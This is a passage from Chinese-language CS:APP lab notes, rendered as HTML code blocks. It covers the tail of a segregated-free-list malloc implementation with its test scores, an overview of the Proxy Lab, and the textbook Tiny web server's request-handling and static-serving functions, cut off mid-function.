</span><span id=__span-175-13><a id=__codelineno-175-13 name=__codelineno-175-13></a><span class=w>        </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=n>bp</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-175-14><a id=__codelineno-175-14 name=__codelineno-175-14></a><span class=w>        </span><span class=p>{</span>
</span><span id=__span-175-15><a id=__codelineno-175-15 name=__codelineno-175-15></a><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>GET_SIZE</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>bp</span><span class=p>))</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=n>asize</span><span class=p>)</span>
</span><span id=__span-175-16><a id=__codelineno-175-16 name=__codelineno-175-16></a><span class=w>            </span><span class=p>{</span>
</span><span id=__span-175-17><a id=__codelineno-175-17 name=__codelineno-175-17></a><span class=w>                </span><span class=k>return</span><span class=w> </span><span class=p>(</span><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>bp</span><span class=p>;</span>
</span><span id=__span-175-18><a id=__codelineno-175-18 name=__codelineno-175-18></a><span class=w>            </span><span class=p>}</span>
</span><span id=__span-175-19><a id=__codelineno-175-19 name=__codelineno-175-19></a><span class=w>            </span><span class=cm>/* 用后继找下一块 */</span>
</span><span id=__span-175-20><a id=__codelineno-175-20 name=__codelineno-175-20></a><span class=w>            </span><span class=n>bp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>GET_SUC</span><span class=p>(</span><span class=n>bp</span><span class=p>);</span>
</span><span id=__span-175-21><a id=__codelineno-175-21 name=__codelineno-175-21></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-175-22><a id=__codelineno-175-22 name=__codelineno-175-22></a><span class=w>        </span><span class=cm>/* 找不到则进入下一个大小类 */</span>
</span><span id=__span-175-23><a id=__codelineno-175-23 name=__codelineno-175-23></a><span class=w>        </span><span class=n>num</span><span class=o>++</span><span class=p>;</span>
</span><span id=__span-175-24><a id=__codelineno-175-24 name=__codelineno-175-24></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-175-25><a id=__codelineno-175-25 name=__codelineno-175-25></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=nb>NULL</span><span class=p>;</span>
</span><span id=__span-175-26><a id=__codelineno-175-26 name=__codelineno-175-26></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> </li> <li> <h4 id=_27>测试结果及分数<a class=headerlink href=#_27 title="Permanent link">¶</a></h4> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-176-1> 1</a></span>
<span class=normal><a href=#__codelineno-176-2> 2</a></span>
<span class=normal><a href=#__codelineno-176-3> 3</a></span>
<span class=normal><a href=#__codelineno-176-4> 4</a></span>
<span class=normal><a href=#__codelineno-176-5> 5</a></span>
<span class=normal><a href=#__codelineno-176-6> 6</a></span>
<span class=normal><a href=#__codelineno-176-7> 7</a></span>
<span class=normal><a href=#__codelineno-176-8> 8</a></span>
<span class=normal><a href=#__codelineno-176-9> 9</a></span>
<span class=normal><a href=#__codelineno-176-10>10</a></span>
<span class=normal><a href=#__codelineno-176-11>11</a></span>
<span class=normal><a href=#__codelineno-176-12>12</a></span>
<span class=normal><a href=#__codelineno-176-13>13</a></span>
<span class=normal><a href=#__codelineno-176-14>14</a></span>
<span class=normal><a href=#__codelineno-176-15>15</a></span>
<span class=normal><a href=#__codelineno-176-16>16</a></span>
<span class=normal><a href=#__codelineno-176-17>17</a></span>
<span class=normal><a href=#__codelineno-176-18>18</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-176-1><a id=__codelineno-176-1 name=__codelineno-176-1></a><span class=m>08</span>-Malloc-Lab$<span class=w> </span>./mdriver<span class=w> </span>-t<span class=w> </span>./traces<span class=w> </span>-V
</span><span id=__span-176-2><a id=__codelineno-176-2 name=__codelineno-176-2></a>
</span><span id=__span-176-3><a id=__codelineno-176-3 name=__codelineno-176-3></a>Results<span class=w> </span><span class=k>for</span><span class=w> </span>mm<span class=w> </span>malloc:
</span><span id=__span-176-4><a id=__codelineno-176-4 name=__codelineno-176-4></a>trace<span class=w>  </span>valid<span class=w>  </span>util<span class=w>     </span>ops<span class=w>      </span>secs<span class=w>  </span>Kops
</span><span id=__span-176-5><a id=__codelineno-176-5 name=__codelineno-176-5></a><span class=m>0</span><span class=w>       </span>yes<span class=w>   </span><span class=m>98</span>%<span class=w>    </span><span class=m>5694</span><span class=w>  </span><span class=m>0</span>.000185<span class=w> </span><span class=m>30795</span>
</span><span id=__span-176-6><a id=__codelineno-176-6 name=__codelineno-176-6></a><span class=m>1</span><span class=w>       </span>yes<span class=w>   </span><span class=m>98</span>%<span class=w>    </span><span class=m>5848</span><span class=w>  </span><span class=m>0</span>.000286<span class=w> </span><span class=m>20419</span>
</span><span id=__span-176-7><a id=__codelineno-176-7 name=__codelineno-176-7></a><span class=m>2</span><span class=w>       </span>yes<span class=w>   </span><span class=m>97</span>%<span class=w>    </span><span class=m>6648</span><span class=w>  </span><span class=m>0</span>.000306<span class=w> </span><span class=m>21718</span>
</span><span id=__span-176-8><a id=__codelineno-176-8 name=__codelineno-176-8></a><span class=m>3</span><span class=w>       </span>yes<span class=w>   </span><span class=m>99</span>%<span class=w>    </span><span class=m>5380</span><span class=w>  </span><span class=m>0</span>.000158<span class=w> </span><span class=m>34051</span>
</span><span id=__span-176-9><a id=__codelineno-176-9 name=__codelineno-176-9></a><span class=m>4</span><span class=w>       </span>yes<span class=w>   </span><span class=m>66</span>%<span class=w>   </span><span class=m>14400</span><span class=w>  </span><span class=m>0</span>.000298<span class=w> </span><span class=m>48338</span>
</span><span id=__span-176-10><a id=__codelineno-176-10 name=__codelineno-176-10></a><span class=m>5</span><span class=w>       </span>yes<span class=w>   </span><span class=m>93</span>%<span class=w>    </span><span class=m>4800</span><span class=w>  </span><span class=m>0</span>.000284<span class=w> </span><span class=m>16895</span>
</span><span id=__span-176-11><a id=__codelineno-176-11 name=__codelineno-176-11></a><span class=m>6</span><span class=w>       </span>yes<span class=w>   </span><span class=m>90</span>%<span class=w>    </span><span class=m>4800</span><span class=w>  </span><span class=m>0</span>.000260<span class=w> </span><span class=m>18490</span>
</span><span id=__span-176-12><a id=__codelineno-176-12 name=__codelineno-176-12></a><span class=m>7</span><span class=w>       </span>yes<span class=w>   </span><span class=m>55</span>%<span class=w>   </span><span class=m>12000</span><span class=w>  </span><span class=m>0</span>.000316<span class=w> </span><span class=m>38035</span>
</span><span id=__span-176-13><a id=__codelineno-176-13 name=__codelineno-176-13></a><span class=m>8</span><span class=w>       </span>yes<span class=w>   </span><span class=m>51</span>%<span class=w>   </span><span class=m>24000</span><span class=w>  </span><span class=m>0</span>.000434<span class=w> </span><span class=m>55363</span>
</span><span id=__span-176-14><a id=__codelineno-176-14 name=__codelineno-176-14></a><span class=m>9</span><span class=w>       </span>yes<span class=w>   </span><span class=m>25</span>%<span class=w>   </span><span class=m>14401</span><span class=w>  </span><span class=m>0</span>.042608<span class=w>   </span><span class=m>338</span>
</span><span id=__span-176-15><a id=__codelineno-176-15 name=__codelineno-176-15></a><span class=m>10</span><span class=w>      </span>yes<span class=w>   </span><span class=m>29</span>%<span class=w>   </span><span class=m>14401</span><span class=w>  </span><span class=m>0</span>.002024<span class=w>  </span><span class=m>7115</span>
</span><span id=__span-176-16><a id=__codelineno-176-16 name=__codelineno-176-16></a>Total<span class=w>         </span><span class=m>73</span>%<span class=w>  </span><span class=m>112372</span><span class=w>  </span><span class=m>0</span>.047158<span class=w>  </span><span class=m>2383</span>
</span><span id=__span-176-17><a id=__codelineno-176-17 name=__codelineno-176-17></a>
</span><span id=__span-176-18><a id=__codelineno-176-18 name=__codelineno-176-18></a>Perf<span class=w> </span><span class=nv>index</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=m>44</span><span class=w> </span><span class=o>(</span>util<span class=o>)</span><span class=w> </span>+<span class=w> </span><span class=m>40</span><span class=w> </span><span class=o>(</span>thru<span class=o>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=m>84</span>/100
</span></code></pre></div></td></tr></table></div> <p>这个提升是巨大的！与 Implict Free List 进行对比，本方法空间利用率略微降低了，而吞吐量提高了。</p> </li> </ol> <h2 id=proxy-lab>Proxy Lab<a class=headerlink href=#proxy-lab title="Permanent link">¶</a></h2> <ol> <li> <h3 id=_28>实验概览<a class=headerlink href=#_28 title="Permanent link">¶</a></h3> <p>Web Proxy 是 Web 浏览器和服务器之间的一个中间程序。我们日常使用浏览器访问某个网站时，浏览器不是直接请求服务器来获取内容的，而是联系 Proxy，Proxy 转发请求到服务器，服务器回复 Proxy 后，Proxy 再将回复发送到浏览器。</p> <p>即原来的客户端-服务器是这样：</p> <p><img alt="alt text" src=../../img/image-113.png></p> <p>加了 Proxy 变成这样:</p> <p><img alt="alt text" src=../../img/image-114.png></p> <p>本实验就是要实现一个支持多线程带缓存的 Web Proxy，分为三个部分来进行：</p> <ul> <li>Part 1：实现一个最基础的顺序代理 (修改<code>proxy.c</code>)</li> <li>Part 2：进一步优化，使代理支持多线程（生产者-消费者模型） (修改<code>proxy.c</code>/新增<code>sbuf.c</code>和<code>sbuf.h</code>)</li> <li>Part 3：使用 LRU 策略缓存 Web 中的对象（读者-写者模型）</li> </ul> </li> <li> <h3 id=tiny-web>TINY Web 服务器详解<a class=headerlink href=#tiny-web title="Permanent link">¶</a></h3> <p>代理相对于客户端来说充当了服务端的角色，相对于服务端来说又充当了客户端的角色。CSAPP 课本用 250 行代码为我们实现了一个非常简单的 Web 服务器，在做实验之前，深刻理解它是非常重要的。</p> <p>首先要做的事就是解析 HTTP 请求：</p> <h4 id=http>解析 HTTP 请求<a class=headerlink href=#http title="Permanent link">¶</a></h4> <p>HTTP 请求的组成是这样的：一个请求行，后面跟随零个或更多个请求报头，再跟随一个空的文本行来终止报头列表。请求行的形式是：<code>method URI version</code>，本服务器只支持 <code>GET</code> 方法。</p> <p>将 <code>URI</code> 解析出来后，需要判断请求的是静态内容还是动态内容，分别执行。给出函数 <code>doit</code>：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-177-1> 1</a></span>
<span class=normal><a href=#__codelineno-177-2> 2</a></span>
<span class=normal><a href=#__codelineno-177-3> 3</a></span>
<span class=normal><a href=#__codelineno-177-4> 4</a></span>
<span class=normal><a href=#__codelineno-177-5> 5</a></span>
<span class=normal><a href=#__codelineno-177-6> 6</a></span>
<span class=normal><a href=#__codelineno-177-7> 7</a></span>
<span class=normal><a href=#__codelineno-177-8> 8</a></span>
<span class=normal><a href=#__codelineno-177-9> 9</a></span>
<span class=normal><a href=#__codelineno-177-10>10</a></span>
<span class=normal><a href=#__codelineno-177-11>11</a></span>
<span class=normal><a href=#__codelineno-177-12>12</a></span>
<span class=normal><a href=#__codelineno-177-13>13</a></span>
<span class=normal><a href=#__codelineno-177-14>14</a></span>
<span class=normal><a href=#__codelineno-177-15>15</a></span>
<span class=normal><a href=#__codelineno-177-16>16</a></span>
<span class=normal><a href=#__codelineno-177-17>17</a></span>
<span class=normal><a href=#__codelineno-177-18>18</a></span>
<span class=normal><a href=#__codelineno-177-19>19</a></span>
<span class=normal><a href=#__codelineno-177-20>20</a></span>
<span class=normal><a href=#__codelineno-177-21>21</a></span>
<span class=normal><a href=#__codelineno-177-22>22</a></span>
<span class=normal><a href=#__codelineno-177-23>23</a></span>
<span class=normal><a href=#__codelineno-177-24>24</a></span>
<span class=normal><a href=#__codelineno-177-25>25</a></span>
<span class=normal><a href=#__codelineno-177-26>26</a></span>
<span class=normal><a href=#__codelineno-177-27>27</a></span>
<span class=normal><a href=#__codelineno-177-28>28</a></span>
<span class=normal><a href=#__codelineno-177-29>29</a></span>
<span class=normal><a href=#__codelineno-177-30>30</a></span>
<span class=normal><a href=#__codelineno-177-31>31</a></span>
<span class=normal><a href=#__codelineno-177-32>32</a></span>
<span class=normal><a href=#__codelineno-177-33>33</a></span>
<span class=normal><a href=#__codelineno-177-34>34</a></span>
<span class=normal><a href=#__codelineno-177-35>35</a></span>
<span class=normal><a href=#__codelineno-177-36>36</a></span>
<span class=normal><a href=#__codelineno-177-37>37</a></span>
<span class=normal><a href=#__codelineno-177-38>38</a></span>
<span class=normal><a href=#__codelineno-177-39>39</a></span>
<span class=normal><a href=#__codelineno-177-40>40</a></span>
<span class=normal><a href=#__codelineno-177-41>41</a></span>
<span class=normal><a href=#__codelineno-177-42>42</a></span>
<span class=normal><a href=#__codelineno-177-43>43</a></span>
<span class=normal><a href=#__codelineno-177-44>44</a></span>
<span class=normal><a href=#__codelineno-177-45>45</a></span>
<span class=normal><a href=#__codelineno-177-46>46</a></span>
<span class=normal><a href=#__codelineno-177-47>47</a></span>
<span class=normal><a href=#__codelineno-177-48>48</a></span>
<span class=normal><a href=#__codelineno-177-49>49</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-177-1><a id=__codelineno-177-1 name=__codelineno-177-1></a><span class=cm>/*</span>
</span><span id=__span-177-2><a id=__codelineno-177-2 name=__codelineno-177-2></a><span class=cm>* 处理请求</span>
</span><span id=__span-177-3><a id=__codelineno-177-3 name=__codelineno-177-3></a><span class=cm>*/</span>
</span><span id=__span-177-4><a id=__codelineno-177-4 name=__codelineno-177-4></a><span class=kt>void</span><span class=w> </span><span class=nf>doit</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>fd</span><span class=p>)</span>
</span><span id=__span-177-5><a id=__codelineno-177-5 name=__codelineno-177-5></a><span class=p>{</span>
</span><span id=__span-177-6><a id=__codelineno-177-6 name=__codelineno-177-6></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>is_static</span><span class=p>;</span>
</span><span id=__span-177-7><a id=__codelineno-177-7 name=__codelineno-177-7></a><span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>stat</span><span class=w> </span><span class=n>sbuf</span><span class=p>;</span>
</span><span id=__span-177-8><a id=__codelineno-177-8 name=__codelineno-177-8></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=n>buf</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>],</span><span class=w> </span><span class=n>method</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>],</span><span class=w> </span><span class=n>uri</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>],</span><span class=w> </span><span class=n>version</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>];</span>
</span><span id=__span-177-9><a id=__codelineno-177-9 name=__codelineno-177-9></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=n>filename</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>],</span><span class=w> </span><span class=n>cgiargs</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>];</span>
</span><span id=__span-177-10><a id=__codelineno-177-10 name=__codelineno-177-10></a><span class=w>    </span><span class=n>rio_t</span><span class=w> </span><span class=n>rio</span><span class=p>;</span>
</span><span id=__span-177-11><a id=__codelineno-177-11 name=__codelineno-177-11></a>
</span><span id=__span-177-12><a id=__codelineno-177-12 name=__codelineno-177-12></a><span class=w>    </span><span class=cm>/* 读取请求行 */</span>
</span><span id=__span-177-13><a id=__codelineno-177-13 name=__codelineno-177-13></a><span class=w>    </span><span class=n>Rio_readinitb</span><span class=p>(</span><span class=o>&amp;</span><span class=n>rio</span><span class=p>,</span><span class=w> </span><span class=n>fd</span><span class=p>);</span>
</span><span id=__span-177-14><a id=__codelineno-177-14 name=__codelineno-177-14></a><span class=w>    </span><span class=n>Rio_readlineb</span><span class=p>(</span><span class=o>&amp;</span><span class=n>rio</span><span class=p>,</span><span class=w> </span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=n>MAXLINE</span><span class=p>);</span>
</span><span id=__span-177-15><a id=__codelineno-177-15 name=__codelineno-177-15></a><span class=w>    </span><span class=n>printf</span><span class=p>(</span><span class=s>"Request headers:</span><span class=se>\n</span><span class=s>"</span><span class=p>);</span>
</span><span id=__span-177-16><a id=__codelineno-177-16 name=__codelineno-177-16></a><span class=w>    </span><span class=n>printf</span><span class=p>(</span><span class=s>"%s"</span><span class=p>,</span><span class=w> </span><span class=n>buf</span><span class=p>);</span>
</span><span id=__span-177-17><a id=__codelineno-177-17 name=__codelineno-177-17></a><span class=w>    </span><span class=n>sscanf</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=s>"%s %s %s"</span><span class=p>,</span><span class=w> </span><span class=n>method</span><span class=p>,</span><span class=w> </span><span class=n>uri</span><span class=p>,</span><span class=w> </span><span class=n>version</span><span class=p>);</span><span class=w> </span><span class=c1>// 解析请求行</span>
</span><span id=__span-177-18><a id=__codelineno-177-18 name=__codelineno-177-18></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>strcasecmp</span><span class=p>(</span><span class=n>method</span><span class=p>,</span><span class=w> </span><span class=s>"GET"</span><span class=p>))</span><span class=w> </span><span class=c1>// 只支持 GET 方法</span>
</span><span id=__span-177-19><a id=__codelineno-177-19 name=__codelineno-177-19></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-177-20><a id=__codelineno-177-20 name=__codelineno-177-20></a><span class=w>        </span><span class=n>clienterror</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span><span class=w> </span><span class=n>method</span><span class=p>,</span><span class=w> </span><span class=s>"501"</span><span class=p>,</span><span class=w> </span><span class=s>"Not Implemented"</span><span class=p>,</span><span class=w> </span><span class=s>"Tiny does not implement this method"</span><span class=p>);</span>
</span><span id=__span-177-21><a id=__codelineno-177-21 name=__codelineno-177-21></a><span class=w>        </span><span class=k>return</span><span class=p>;</span>
</span><span id=__span-177-22><a id=__codelineno-177-22 name=__codelineno-177-22></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-177-23><a id=__codelineno-177-23 name=__codelineno-177-23></a><span class=w>    </span><span class=n>read_requesthdrs</span><span class=p>(</span><span class=o>&amp;</span><span class=n>rio</span><span class=p>);</span><span class=w>            </span><span class=c1>// 读取请求报头</span>
</span><span id=__span-177-24><a id=__codelineno-177-24 name=__codelineno-177-24></a><span class=w>    </span><span class=n>is_static</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>parse_uri</span><span class=p>(</span><span class=n>uri</span><span class=p>,</span><span class=w> </span><span class=n>filename</span><span class=p>,</span><span class=w> </span><span class=n>cgiargs</span><span class=p>);</span><span class=w> </span><span class=c1>// 解析 URI</span>
</span><span id=__span-177-25><a id=__codelineno-177-25 name=__codelineno-177-25></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>stat</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>sbuf</span><span class=p>)</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w>     </span><span class=c1>// 检查文件是否存在</span>
</span><span id=__span-177-26><a id=__codelineno-177-26 name=__codelineno-177-26></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-177-27><a id=__codelineno-177-27 name=__codelineno-177-27></a><span class=w>        </span><span class=n>clienterror</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span><span class=w> </span><span class=n>filename</span><span class=p>,</span><span class=w> </span><span class=s>"404"</span><span class=p>,</span><span class=w> </span><span class=s>"Not Found"</span><span class=p>,</span><span class=w> </span><span class=s>"Tiny couldn't find this file"</span><span class=p>);</span>
</span><span id=__span-177-28><a id=__codelineno-177-28 name=__codelineno-177-28></a><span class=w>        </span><span class=k>return</span><span class=p>;</span>
</span><span id=__span-177-29><a id=__codelineno-177-29 name=__codelineno-177-29></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-177-30><a id=__codelineno-177-30 name=__codelineno-177-30></a>
</span><span id=__span-177-31><a id=__codelineno-177-31 name=__codelineno-177-31></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>is_static</span><span class=p>)</span><span class=w> </span><span class=c1>// 静态内容</span>
</span><span id=__span-177-32><a id=__codelineno-177-32 name=__codelineno-177-32></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-177-33><a id=__codelineno-177-33 name=__codelineno-177-33></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=n>S_ISREG</span><span class=p>(</span><span class=n>sbuf</span><span class=p>.</span><span class=n>st_mode</span><span class=p>))</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=o>!</span><span class=p>(</span><span class=n>S_IRUSR</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>sbuf</span><span class=p>.</span><span class=n>st_mode</span><span class=p>))</span>
</span><span id=__span-177-34><a id=__codelineno-177-34 name=__codelineno-177-34></a><span class=w>        </span><span class=p>{</span>
</span><span id=__span-177-35><a id=__codelineno-177-35 name=__codelineno-177-35></a><span class=w>            </span><span class=n>clienterror</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span><span class=w> </span><span class=n>filename</span><span class=p>,</span><span class=w> </span><span class=s>"403"</span><span class=p>,</span><span class=w> </span><span class=s>"Forbidden"</span><span class=p>,</span><span class=w> </span><span class=s>"Tiny couldn't read the file"</span><span class=p>);</span>
</span><span id=__span-177-36><a id=__codelineno-177-36 name=__codelineno-177-36></a><span class=w>            </span><span class=k>return</span><span class=p>;</span>
</span><span id=__span-177-37><a id=__codelineno-177-37 name=__codelineno-177-37></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-177-38><a id=__codelineno-177-38 name=__codelineno-177-38></a><span class=w>        </span><span class=n>serve_static</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span><span class=w> </span><span class=n>filename</span><span class=p>,</span><span class=w> </span><span class=n>sbuf</span><span class=p>.</span><span class=n>st_size</span><span class=p>);</span><span class=w> </span><span class=c1>// 服务静态内容</span>
</span><span id=__span-177-39><a id=__codelineno-177-39 name=__codelineno-177-39></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-177-40><a id=__codelineno-177-40 name=__codelineno-177-40></a><span class=w>    </span><span class=k>else</span><span class=w>           </span><span class=c1>// 动态内容</span>
</span><span id=__span-177-41><a id=__codelineno-177-41 name=__codelineno-177-41></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-177-42><a id=__codelineno-177-42 name=__codelineno-177-42></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=n>S_ISREG</span><span class=p>(</span><span class=n>sbuf</span><span class=p>.</span><span class=n>st_mode</span><span class=p>))</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=o>!</span><span class=p>(</span><span class=n>S_IXUSR</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>sbuf</span><span class=p>.</span><span class=n>st_mode</span><span class=p>))</span>
</span><span id=__span-177-43><a id=__codelineno-177-43 name=__codelineno-177-43></a><span class=w>        </span><span class=p>{</span>
</span><span id=__span-177-44><a id=__codelineno-177-44 name=__codelineno-177-44></a><span class=w>            </span><span class=n>clienterror</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span><span class=w> </span><span class=n>filename</span><span class=p>,</span><span class=w> </span><span class=s>"403"</span><span class=p>,</span><span class=w> </span><span class=s>"Forbidden"</span><span class=p>,</span><span class=w> </span><span class=s>"Tiny couldn't run the CGI program"</span><span class=p>);</span>
</span><span id=__span-177-45><a id=__codelineno-177-45 name=__codelineno-177-45></a><span class=w>            </span><span class=k>return</span><span class=p>;</span>
</span><span id=__span-177-46><a id=__codelineno-177-46 name=__codelineno-177-46></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-177-47><a id=__codelineno-177-47 name=__codelineno-177-47></a><span class=w>        </span><span class=n>serve_dynamic</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span><span class=w> </span><span class=n>filename</span><span class=p>,</span><span class=w> </span><span class=n>cgiargs</span><span class=p>);</span><span class=w> </span><span class=c1>// 服务动态内容</span>
</span><span id=__span-177-48><a id=__codelineno-177-48 name=__codelineno-177-48></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-177-49><a id=__codelineno-177-49 name=__codelineno-177-49></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <h4 id=_29>提供静态内容<a class=headerlink href=#_29 title="Permanent link">¶</a></h4> <p>一个 HTTP 响应的组成是这样的：一个响应行，后面跟随着零个或更多的相应报头，再跟随着一个终止报头的空行，随后跟随响应主体，相应行的格式为<code>version status-code status-massage</code>。于是给出函数<code>serve_static</code>:</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-178-1> 1</a></span>
<span class=normal><a href=#__codelineno-178-2> 2</a></span>
<span class=normal><a href=#__codelineno-178-3> 3</a></span>
<span class=normal><a href=#__codelineno-178-4> 4</a></span>
<span class=normal><a href=#__codelineno-178-5> 5</a></span>
<span class=normal><a href=#__codelineno-178-6> 6</a></span>
<span class=normal><a href=#__codelineno-178-7> 7</a></span>
<span class=normal><a href=#__codelineno-178-8> 8</a></span>
<span class=normal><a href=#__codelineno-178-9> 9</a></span>
<span class=normal><a href=#__codelineno-178-10>10</a></span>
<span class=normal><a href=#__codelineno-178-11>11</a></span>
<span class=normal><a href=#__codelineno-178-12>12</a></span>
<span class=normal><a href=#__codelineno-178-13>13</a></span>
<span class=normal><a href=#__codelineno-178-14>14</a></span>
<span class=normal><a href=#__codelineno-178-15>15</a></span>
<span class=normal><a href=#__codelineno-178-16>16</a></span>
<span class=normal><a href=#__codelineno-178-17>17</a></span>
<span class=normal><a href=#__codelineno-178-18>18</a></span>
<span class=normal><a href=#__codelineno-178-19>19</a></span>
<span class=normal><a href=#__codelineno-178-20>20</a></span>
<span class=normal><a href=#__codelineno-178-21>21</a></span>
<span class=normal><a href=#__codelineno-178-22>22</a></span>
<span class=normal><a href=#__codelineno-178-23>23</a></span>
<span class=normal><a href=#__codelineno-178-24>24</a></span>
<span class=normal><a href=#__codelineno-178-25>25</a></span>
<span class=normal><a href=#__codelineno-178-26>26</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-178-1><a id=__codelineno-178-1 name=__codelineno-178-1></a><span class=cm>/*</span>
</span><span id=__span-178-2><a id=__codelineno-178-2 name=__codelineno-178-2></a><span class=cm>* 服务静态内容</span>
</span><span id=__span-178-3><a id=__codelineno-178-3 name=__codelineno-178-3></a><span class=cm>*/</span>
</span><span id=__span-178-4><a id=__codelineno-178-4 name=__codelineno-178-4></a><span class=kt>void</span><span class=w> </span><span class=nf>serve_static</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>fd</span><span class=p>,</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>filename</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>filesize</span><span class=p>)</span>
</span><span id=__span-178-5><a id=__codelineno-178-5 name=__codelineno-178-5></a><span class=p>{</span>
</span><span id=__span-178-6><a id=__codelineno-178-6 name=__codelineno-178-6></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>srcfd</span><span class=p>;</span>
</span><span id=__span-178-7><a id=__codelineno-178-7 name=__codelineno-178-7></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>srcp</span><span class=p>,</span><span class=w> </span><span class=n>filetype</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>],</span><span class=w> </span><span class=n>buf</span><span class=p>[</span><span class=n>MAXBUF</span><span class=p>];</span>
</span><span id=__span-178-8><a id=__codelineno-178-8 name=__codelineno-178-8></a>
</span><span id=__span-178-9><a id=__codelineno-178-9 name=__codelineno-178-9></a><span class=w>    </span><span class=cm>/* 发送响应行给client */</span>
</span><span id=__span-178-10><a id=__codelineno-178-10 name=__codelineno-178-10></a><span class=w>    </span><span class=n>get_filetype</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span><span class=w> </span><span class=n>filetype</span><span class=p>);</span>
</span><span id=__span-178-11><a id=__codelineno-178-11 name=__codelineno-178-11></a><span class=w>    </span><span class=n>sprintf</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=s>"HTTP/1.0 200 OK</span><span class=se>\r\n</span><span class=s>"</span><span class=p>);</span>
</span><span id=__span-178-12><a id=__codelineno-178-12 name=__codelineno-178-12></a><span class=w>    </span><span class=n>sprintf</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=s>"%sServer: Tiny Web Server</span><span class=se>\r\n</span><span class=s>"</span><span class=p>,</span><span class=w> </span><span class=n>buf</span><span class=p>);</span>
</span><span id=__span-178-13><a id=__codelineno-178-13 name=__codelineno-178-13></a><span class=w>    </span><span class=n>sprintf</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=s>"%sConnection: close</span><span class=se>\r\n</span><span class=s>"</span><span class=p>,</span><span class=w> </span><span class=n>buf</span><span class=p>);</span>
</span><span id=__span-178-14><a id=__codelineno-178-14 name=__codelineno-178-14></a><span class=w>    </span><span class=n>sprintf</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=s>"%sContent-length: %d</span><span class=se>\r\n</span><span class=s>"</span><span class=p>,</span><span class=w> </span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=n>filesize</span><span class=p>);</span>
